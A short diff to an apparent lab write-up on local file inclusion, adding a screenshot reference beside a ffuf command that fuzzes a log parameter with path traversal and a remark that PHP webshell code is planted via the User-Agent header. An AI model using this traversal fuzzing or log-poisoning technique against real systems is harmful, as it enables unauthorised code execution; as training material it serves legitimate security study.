@@ -185,6 +185,8 @@ cat index.php | grep -ie 'Admin'
 ffuf -c -ic -w /usr/share/seclists/Fuzzing/XSS/XSS-With-Context-Jhaddix.txt:FUZZ -u 'http://94.237.49.11:53690/ilf_admin/index.php?log=../../../../../../../..FUZZ' -replay-proxy http://127.0.0.1:8080 -fs 2046
 ``` 
 
+![LFI-skills-assess-log-path](/images/LFI-skills-assess-log-path.png)  
+
 >In the log we notice the `user-agent` is reflected and stored.
 >PHP webshell code inserted as the value of `User-Agent`:  
 
